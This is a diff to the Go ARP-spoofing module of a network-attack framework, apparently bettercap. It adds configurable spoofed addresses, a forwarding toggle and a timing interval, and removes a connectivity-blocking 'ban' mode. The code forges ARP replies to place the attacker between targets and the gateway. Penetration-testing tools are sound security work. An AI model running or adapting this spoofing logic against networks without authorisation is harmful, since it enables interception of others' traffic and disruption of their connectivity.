@@ -10,34 +10,34 @@ import (
 	"github.com/bettercap/bettercap/network"
 	"github.com/bettercap/bettercap/packets"
 	"github.com/bettercap/bettercap/session"
-
-	"github.com/malfunkt/iprange"
 )
 
 type ArpSpoofer struct {
 	session.SessionModule
-	addresses   []net.IP
-	macs        []net.HardwareAddr
+	tAddresses  []net.IP
+	tMacs       []net.HardwareAddr
 	wAddresses  []net.IP
 	wMacs       []net.HardwareAddr
+	sAdresses   []net.IP
 	fullDuplex  bool
-	internal    bool
-	ban         bool
 	skipRestore bool
+	forward     bool
+	intervalMs  int
 	waitGroup   *sync.WaitGroup
 }
 
 func NewArpSpoofer(s *session.Session) *ArpSpoofer {
 	mod := &ArpSpoofer{
 		SessionModule: session.NewSessionModule("arp.spoof", s),
-		addresses:     make([]net.IP, 0),
-		macs:          make([]net.HardwareAddr, 0),
+		tAddresses:    make([]net.IP, 0),
+		tMacs:         make([]net.HardwareAddr, 0),
 		wAddresses:    make([]net.IP, 0),
 		wMacs:         make([]net.HardwareAddr, 0),
-		ban:           false,
-		internal:      false,
+		sAdresses:     make([]net.IP, 0),
 		fullDuplex:    false,
 		skipRestore:   false,
+		forward:       true,
+		intervalMs:    1000,
 		waitGroup:     &sync.WaitGroup{},
 	}
 
@@ -47,9 +47,7 @@ func NewArpSpoofer(s *session.Session) *ArpSpoofer {
 
 	mod.AddParam(session.NewStringParameter("arp.spoof.whitelist", "", "", "Comma separated list of IP addresses, MAC addresses or aliases to skip while spoofing."))
 
-	mod.AddParam(session.NewBoolParameter("arp.spoof.internal",
-		"false",
-		"If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the external network."))
+	mod.AddParam((session.NewStringParameter("arp.spoof.spoofed", session.ParamGatewayAddress, "", "IP addresses to spoof, also supports nmap style IP ranges.")))
 
 	mod.AddParam(session.NewBoolParameter("arp.spoof.fullduplex",
 		"false",
@@ -69,16 +67,17 @@ func NewArpSpoofer(s *session.Session) *ArpSpoofer {
 		}
 	})
 
+	mod.AddParam(session.NewBoolParameter("arp.spoof.forwarding",
+		"true",
+		"If set to true, IP forwarding will be enabled."))
+
+	mod.AddParam(session.NewIntParameter("arp.spoof.interval",
+		"1000",
+		"Spoofing time interval."))
+
 	mod.AddHandler(session.NewModuleHandler("arp.spoof on", "",
 		"Start ARP spoofer.",
 		func(args []string) error {
-			return mod.Start()
-		}))
-
-	mod.AddHandler(session.NewModuleHandler("arp.ban on", "",
-		"Start ARP spoofer in ban mode, meaning the target(s) connectivity will not work.",
-		func(args []string) error {
-			mod.ban = true
 			return mod.Start()
 		}))
 
@@ -113,29 +112,40 @@ func (mod *ArpSpoofer) Configure() error {
 	var err error
 	var targets string
 	var whitelist string
+	var sTargets string
 
 	if err, mod.fullDuplex = mod.BoolParam("arp.spoof.fullduplex"); err != nil {
 		return err
-	} else if err, mod.internal = mod.BoolParam("arp.spoof.internal"); err != nil {
+	} else if err, mod.forward = mod.BoolParam("arp.spoof.forwarding"); err != nil {
+		return err
+	} else if err, mod.intervalMs = mod.IntParam("arp.spoof.interval"); err != nil {
 		return err
 	} else if err, targets = mod.StringParam("arp.spoof.targets"); err != nil {
 		return err
 	} else if err, whitelist = mod.StringParam("arp.spoof.whitelist"); err != nil {
 		return err
-	} else if mod.addresses, mod.macs, err = network.ParseTargets(targets, mod.Session.Lan.Aliases()); err != nil {
+	} else if err, sTargets = mod.StringParam("arp.spoof.spoofed"); err != nil {
+		return err
+	} else if mod.tAddresses, mod.tMacs, err = network.ParseTargets(targets, mod.Session.Lan.Aliases()); err != nil {
 		return err
 	} else if mod.wAddresses, mod.wMacs, err = network.ParseTargets(whitelist, mod.Session.Lan.Aliases()); err != nil {
 		return err
+	} else if mod.sAdresses, _, err = network.ParseTargets(sTargets, mod.Session.Lan.Aliases()); err != nil {
+		return err
 	}
 
-	mod.Debug(" addresses=%v macs=%v whitelisted-addresses=%v whitelisted-macs=%v", mod.addresses, mod.macs, mod.wAddresses, mod.wMacs)
+	mod.Debug(" addresses=%v macs=%v whitelisted-addresses=%v whitelisted-macs=%v spoofed-addresses=%v", mod.tAddresses, mod.tMacs, mod.wAddresses, mod.wMacs, mod.sAdresses)
 
-	if mod.ban {
-		mod.Warning("running in ban mode, forwarding not enabled!")
-		mod.Session.Firewall.EnableForwarding(false)
-	} else if !mod.Session.Firewall.IsForwardingEnabled() {
+	if mod.forward {
 		mod.Info("enabling forwarding")
-		mod.Session.Firewall.EnableForwarding(true)
+		if !mod.Session.Firewall.IsForwardingEnabled() {
+			mod.Session.Firewall.EnableForwarding(true)
+		}
+	} else {
+		mod.Warning("forwarding is disabled")
+		if mod.Session.Firewall.IsForwardingEnabled() {
+			mod.Session.Firewall.EnableForwarding(false)
+		}
 	}
 
 	return nil
@@ -146,24 +156,16 @@ func (mod *ArpSpoofer) Start() error {
 		return err
 	}
 
-	nTargets := len(mod.addresses) + len(mod.macs)
+	nTargets := len(mod.tAddresses) + len(mod.tMacs)
 	if nTargets == 0 {
 		mod.Warning("list of targets is empty, module not starting.")
 		return nil
 	}
 
 	return mod.SetRunning(true, func() {
-		neighbours := []net.IP{}
+		nSpoofed := len(mod.sAdresses)
 
-		if mod.internal {
-			list, _ := iprange.ParseList(mod.Session.Interface.CIDR())
-			neighbours = list.Expand()
-			nNeigh := len(neighbours) - 2
-
-			mod.Warning("arp spoofer started targeting %d possible network neighbours of %d targets.", nNeigh, nTargets)
-		} else {
-			mod.Info("arp spoofer started, probing %d targets.", nTargets)
-		}
+		mod.Info("arp spoofer started spoofing %d addresses, probing %d targets.", nSpoofed, nTargets)
 
 		if mod.fullDuplex {
 			mod.Warning("full duplex spoofing enabled, if the router has ARP spoofing mechanisms, the attack will fail.")
@@ -172,35 +174,30 @@ func (mod *ArpSpoofer) Start() error {
 		mod.waitGroup.Add(1)
 		defer mod.waitGroup.Done()
 
-		gwIP := mod.Session.Gateway.IP
 		myMAC := mod.Session.Interface.HW
 		for mod.Running() {
-			mod.arpSpoofTargets(gwIP, myMAC, true, false)
-			for _, address := range neighbours {
-				if !mod.Session.Skip(address) {
+			for _, address := range mod.sAdresses {
+				if net.IP.Equal(address, mod.Session.Gateway.IP) || !mod.Session.Skip(address) {
 					mod.arpSpoofTargets(address, myMAC, true, false)
 				}
 			}
 
-			time.Sleep(1 * time.Second)
+			time.Sleep(time.Duration(mod.intervalMs) * time.Millisecond)
 		}
 	})
 }
 
 func (mod *ArpSpoofer) unSpoof() error {
 	if !mod.skipRestore {
-		nTargets := len(mod.addresses) + len(mod.macs)
+		nTargets := len(mod.tAddresses) + len(mod.tMacs)
 		mod.Info("restoring ARP cache of %d targets.", nTargets)
-		mod.arpSpoofTargets(mod.Session.Gateway.IP, mod.Session.Gateway.HW, false, false)
 
-		if mod.internal {
-			list, _ := iprange.ParseList(mod.Session.Interface.CIDR())
-			neighbours := list.Expand()
-			for _, address := range neighbours {
-				if !mod.Session.Skip(address) {
-					if realMAC, err := mod.Session.FindMAC(address, false); err == nil {
-						mod.arpSpoofTargets(address, realMAC, false, false)
-					}
+		for _, address := range mod.sAdresses {
+			if net.IP.Equal(address, mod.Session.Gateway.IP) || !mod.Session.Skip(address) {
+				if realMAC, err := mod.Session.FindMAC(address, false); err == nil {
+					mod.arpSpoofTargets(address, realMAC, false, false)
+				} else {
+					mod.Warning("cannot find mac address for %s, cannot restore", address.String())
 				}
 			}
 		}
@@ -215,7 +212,6 @@ func (mod *ArpSpoofer) Stop() error {
 	return mod.SetRunning(false, func() {
 		mod.Info("waiting for ARP spoofer to stop ...")
 		mod.unSpoof()
-		mod.ban = false
 		mod.waitGroup.Wait()
 	})
 }
@@ -240,7 +236,7 @@ func (mod *ArpSpoofer) getTargets(probe bool) map[string]net.HardwareAddr {
 	targets := make(map[string]net.HardwareAddr)
 
 	// add targets specified by IP address
-	for _, ip := range mod.addresses {
+	for _, ip := range mod.tAddresses {
 		if mod.Session.Skip(ip) {
 			continue
 		}
@@ -250,7 +246,7 @@ func (mod *ArpSpoofer) getTargets(probe bool) map[string]net.HardwareAddr {
 		}
 	}
 	// add targets specified by MAC address
-	for _, hw := range mod.macs {
+	for _, hw := range mod.tMacs {
 		if ip, err := network.ArpInverseLookup(mod.Session.Interface.Name(), hw.String(), false); err == nil {
 			if mod.Session.Skip(net.ParseIP(ip)) {
 				continue
@@ -294,6 +290,12 @@ func (mod *ArpSpoofer) arpSpoofTargets(saddr net.IP, smac net.HardwareAddr, chec
 				continue
 			}
 
+			if bytes.Equal(smac, ourHW) {
+				mod.Debug("telling %s (%s) we are %s", ip, mac, saddr.String())
+			} else {
+				mod.Debug("telling %s (%s) %s is %s", ip, mac, smac, saddr.String())
+			}
+
 			rawIP := net.ParseIP(ip)
 			if err, pkt := packets.NewARPReply(saddr, smac, rawIP, mac); err != nil {
 				mod.Error("error while creating ARP spoof packet for %s: %s", ip, err)
@@ -308,7 +310,7 @@ func (mod *ArpSpoofer) arpSpoofTargets(saddr net.IP, smac net.HardwareAddr, chec
 
 				if isSpoofing {
 					mod.Debug("telling the gw we are %s", ip)
-					// we told the target we're te gateway, not let's tell the
+					// we told the target we're the gateway, now let's tell the
 					// gateway that we are the target
 					if err, gwPacket = packets.NewARPReply(rawIP, ourHW, gwIP, gwHW); err != nil {
 						mod.Error("error while creating ARP spoof packet: %s", err)
